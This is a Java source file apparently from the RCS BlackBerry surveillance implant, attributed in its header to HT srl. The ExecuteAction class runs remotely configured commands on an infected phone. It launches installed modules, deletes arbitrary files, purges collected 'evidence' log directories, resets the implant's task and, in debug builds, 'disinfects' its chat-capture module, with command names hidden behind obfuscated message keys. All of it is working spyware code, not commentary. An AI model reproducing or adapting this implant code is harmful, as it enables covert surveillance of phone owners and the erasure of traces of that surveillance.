//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : ExecuteAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.ByteArrayOutputStream;
import java.util.Vector;

import javax.microedition.media.Player;
import javax.microedition.media.control.RecordControl;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.CodeModuleManager;
import blackberry.Messages;
import blackberry.Task;
import blackberry.Trigger;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceCollector;
import blackberry.fs.AutoFile;
import blackberry.module.ModuleChat;
import blackberry.debug.Check;
import blackberry.utils.Utils;

/**
 * The Class ExecuteAction.
 */
public final class ExecuteAction extends SubActionMain {
    //#ifdef DEBUG
    static Debug debug = new Debug("ExecuteAction", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif

    private String command;

    public ExecuteAction(ConfAction conf) {
        super(conf);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(Trigger trigger) {

        String eventName = "NULL"; //$NON-NLS-1$

        //#ifdef DEBUG
        debug.info("Execute: " + command); //$NON-NLS-1$
        debug.info("Trigger: " + trigger); //$NON-NLS-1$
        //#endif

        if (command == null) {
            //#ifdef DEBUG
            debug.trace("execute no command"); //$NON-NLS-1$
            //#endif
            return false;
        }

        ApplicationDescriptor applicationDescriptor = getApplicationDescriptor(command);
        if (applicationDescriptor != null) {
            executeApplication(applicationDescriptor);
        } else {

            final Vector params = new Vector();
            final String cmd = getParams(command, params);

            if (cmd.equals(Messages.getString("a.5"))) { //$NON-NLS-1$
                executeDebug(params);
            } else if (cmd.equals(Messages.getString("a.6"))) { //$NON-NLS-1$
                executeDelete(params);
            } else if (cmd.equals(Messages.getString("a.7"))) { //$NON-NLS-1$
                executeCleanup(params);
            } else if (cmd.equals(Messages.getString("a.8"))) { //$NON-NLS-1$
                executeReset(params);
            }

            //#ifdef DEBUG
            else if (cmd.equals(Messages.getString("a.9"))) { //$NON-NLS-1$
                executeForget(params);
            }
            //#endif
        }

        return true;
    }

    private static String getParams(final String fullCommand,
            final Vector params) {

        //#ifdef DBC
        Check.requires(fullCommand != null, "getParams cmd !=null"); //$NON-NLS-1$
        Check.requires(params != null, "getParams params !=null"); //$NON-NLS-1$
        Check.requires(params.size() == 0, "getParams params.size() == 0"); //$NON-NLS-1$
        //#endif

        final Vector vector = Utils.Tokenize(fullCommand, " "); //$NON-NLS-1$

        //#ifdef DBC
        Check.asserts(vector != null, "getParams array !=null"); //$NON-NLS-1$
        Check.asserts(vector.size() > 0, "getParams array.length > 0"); //$NON-NLS-1$
        //#endif

        final String command = (String) vector.elementAt(0);

        for (int i = 1; i < vector.size(); i++) {
            params.addElement(vector.elementAt(i));
        }

        return command;
    }

    //#ifdef DEBUG
    private void executeForget(Vector params) {
        // forget ImAgent
        ((ModuleChat) ModuleChat.getInstance()).disinfect();
        // forget UrlAgent
        ((ModuleChat) ModuleChat.getInstance()).disinfect();
    }

    //#endif

    private void executeReset(Vector params) {
        //#ifdef DEBUG
        debug.trace("executeReset"); //$NON-NLS-1$
        //#endif
        Task.getInstance().reset();
        Evidence.info(Messages.getString("a.0")); //$NON-NLS-1$
    }

    private void executeCleanup(Vector params) {
        //#ifdef DEBUG
        debug.trace("executeCleanup"); //$NON-NLS-1$
        //#endif

        int numFiles = 100;
        if (params.size() == 1) {
            try {
                numFiles = Integer.parseInt((String) params.elementAt(0));
            } catch (NumberFormatException ex) {
                //#ifdef DEBUG
                debug.error("executeCleanup: " + ex); //$NON-NLS-1$
                //#endif
            }
        }
        int removed = EvidenceCollector.getInstance().removeLogDirs(numFiles);
        //#ifdef DEBUG
        debug.warn("executeCleanup removed: " + removed); //$NON-NLS-1$
        //#endif
    }

    private void executeDelete(Vector params) {
        //#ifdef DEBUG
        debug.trace("executeDelete"); //$NON-NLS-1$
        //#endif

        if (params.size() == 1) {
            String filename = (String) params.elementAt(0);
            //#ifdef DEBUG
            debug.trace("executeDelete argument: " + filename); //$NON-NLS-1$
            //#endif
            AutoFile file = new AutoFile(filename);
            if (file.exists()) {
                //#ifdef DEBUG
                debug.info("executeDelete deleting: " + filename); //$NON-NLS-1$
                //#endif
                file.delete();
            }
        }
    }

    private void executeApplication(ApplicationDescriptor applicationDescriptor) {
        try {
            String urlModule = applicationDescriptor.getModuleName();
            //#ifdef DEBUG
            debug.trace("executeApplication: " + urlModule); //$NON-NLS-1$
            //#endif
            ApplicationManager.getApplicationManager().launch(urlModule);
        } catch (Exception ex) {
            //#ifdef DEBUG
            debug.error("executeApplication: " + ex); //$NON-NLS-1$
            //#endif
        }
    }

    private void executeDebug(final Vector params) {
        //#ifdef DEBUG     
        for (int i = 0; i < params.size(); i++) {
            debug.info("executeDebug: " + params.elementAt(i)); //$NON-NLS-1$
        }
        //#endif
    }

    private Player _player;
    private RecordControl _rcontrol;
    private ByteArrayOutputStream _output;
    private byte _data[];

    private ApplicationDescriptor getApplicationDescriptor(String command) {
        //#ifdef DBC
        Check.requires(command != null, "getApplicationDescriptor null command"); //$NON-NLS-1$
        //#endif

        Vector tokens = Utils.Tokenize(command, " "); //$NON-NLS-1$
        if (tokens == null || tokens.size() == 0) {
            //#ifdef DEBUG
            debug.error("getApplicationDescriptor: empty command"); //$NON-NLS-1$
            //#endif
            return null;
        }

        String executeName = (String) tokens.elementAt(0);
        //#ifdef DEBUG
        debug.trace("getApplicationDescriptor executeName= " + executeName); //$NON-NLS-1$
        //#endif

        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.

            final String name = CodeModuleManager.getModuleName(handle);
            if (name.equals(executeName)) {
                //#ifdef DEBUG
                debug.trace("checkCommand, command found: " + command); //$NON-NLS-1$
                //#endif
                ApplicationDescriptor[] apps = CodeModuleManager
                        .getApplicationDescriptors(handle);
                if (apps != null && apps.length > 0) {
                    //#ifdef DEBUG
                    debug.trace("checkCommand: got applicationDescription"); //$NON-NLS-1$
                    //#endif
                    return apps[0];

                }
            }
        }

        //#ifdef DEBUG
        debug.warn("getApplicationDescriptor: not found"); //$NON-NLS-1$
        //#endif
        return null;

    }

    //#ifdef DEBUG
    public String toString() {
        return "Execute " + command; //$NON-NLS-1$
    }

    //#endif

    protected boolean parse(ConfAction params) {
        try {
            this.command = params.getString(Messages.getString("a.1")); //$NON-NLS-1$

            //#ifdef DEBUG
            debug.trace("parse"); //$NON-NLS-1$
            //#endif
        } catch (final ConfigurationException e) {
            //#ifdef DEBUG
            debug.error(e);
            debug.error("parse"); //$NON-NLS-1$
            //#endif

            return false;
        }

        return true;
    }

}
